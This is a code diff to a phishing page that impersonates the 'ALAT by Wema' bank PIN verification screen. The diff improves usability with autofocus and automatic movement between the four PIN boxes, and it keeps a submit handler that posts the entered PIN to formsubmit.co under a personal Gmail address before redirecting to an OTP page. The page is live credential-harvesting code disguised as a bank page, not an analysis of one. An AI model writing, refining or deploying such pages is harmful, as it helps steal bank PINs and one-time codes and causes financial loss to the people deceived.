@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Add this -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verify PIN | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
 </head>
@@ -21,7 +21,7 @@
           <div class="formSec">
             <form id="pin-form">
               <div class="formPin">
-                <input type="password" name="pin-0" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="password" name="pin-0" maxlength="1" class="pin-input" inputmode="numeric" required autofocus />
                 <input type="password" name="pin-1" maxlength="1" class="pin-input" inputmode="numeric" required />
                 <input type="password" name="pin-2" maxlength="1" class="pin-input" inputmode="numeric" required />
                 <input type="password" name="pin-3" maxlength="1" class="pin-input" inputmode="numeric" required />
@@ -32,7 +32,6 @@
 
               <div class="buttonSec">
                 <button type="submit" style="width: 100%; max-width: 22rem; padding: 12px; border-radius: 7px; border: none;">Login</button>
-        
               </div>
             </form>
           </div>
@@ -42,17 +41,42 @@
   </div>
 
 <script>
-  const pinForm = document.getElementById('pin-form');
-  pinForm.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const formData = new FormData(pinForm);
-
-    await fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
-      method: 'POST',
-      body: formData
+  // Auto-focus movement between PIN inputs
+  document.addEventListener('DOMContentLoaded', function() {
+    const pinInputs = document.querySelectorAll('.pin-input');
+    
+    // Add event listeners to all PIN inputs
+    pinInputs.forEach((input, index) => {
+      // Move to next input when a digit is entered
+      input.addEventListener('input', function() {
+        if (this.value.length === 1) {
+          if (index < pinInputs.length - 1) {
+            pinInputs[index + 1].focus();
+          }
+        }
+      });
+      
+      // Handle backspace to move to previous input
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
     });
+    
+    // Form submission handler
+    const pinForm = document.getElementById('pin-form');
+    pinForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const formData = new FormData(pinForm);
 
-    window.location.href = 'otp.html'; // Redirect after success
+      await fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
+        method: 'POST',
+        body: formData
+      });
+
+      window.location.href = 'otp.html'; // Redirect after success
+    });
   });
 </script>
 
